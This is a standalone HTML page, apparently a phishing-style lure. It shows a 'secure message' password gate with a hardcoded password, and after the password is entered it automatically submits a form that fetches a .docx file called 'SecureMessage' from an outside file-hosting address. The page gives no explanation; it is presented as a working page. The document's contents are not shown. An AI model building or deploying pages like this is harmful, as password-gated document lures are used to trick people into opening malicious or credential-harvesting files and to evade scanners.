<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Protected Page</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: 0;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 300px;
        }
        h2 {
            color: #333;
        }
        input {
            padding: 12px;
            margin: 15px 0;
            width: calc(100% - 24px);
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
        }
        input:focus {
            border-color: #667eea;
        }
        button {
            padding: 12px;
            width: 100%;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #764ba2;
        }
        .message {
            margin-top: 15px;
            font-weight: bold;
        }
        .checkmarks {
            font-size: 24px;
            color: green;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Enter Password</h2>
        <input type="password" id="password" placeholder="Enter password" required>
        <button onclick="checkPassword()">Submit</button>
        <div class="message" id="message"></div>
    </div>

    <script>
        function checkPassword() {
            const password = document.getElementById("password").value;
            const message = document.getElementById("message");

            if (password === "catchingphish") {
                message.style.color = 'green';
                message.innerHTML = "<div class='checkmarks'>âœ”</div>SECURE PASSWORD ENTERED";

                setTimeout(() => {
                    const url = "https://img1.wsimg.com/blobby/go/29b566bd-e2b0-49b9-9acc-cf41ea51de07/downloads/a3bec121-4160-43dd-910b-d1e4cb27d85e/SecureMessage_982309592%20(2).docx?ver=1742856596695";
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = url;
                    document.body.appendChild(form);
                    form.submit();
                }, 3000);

            } else {
                message.style.color = 'red';
                message.textContent = "Incorrect password. Try again.";
            }
        }
    </script>
</body>
</html>
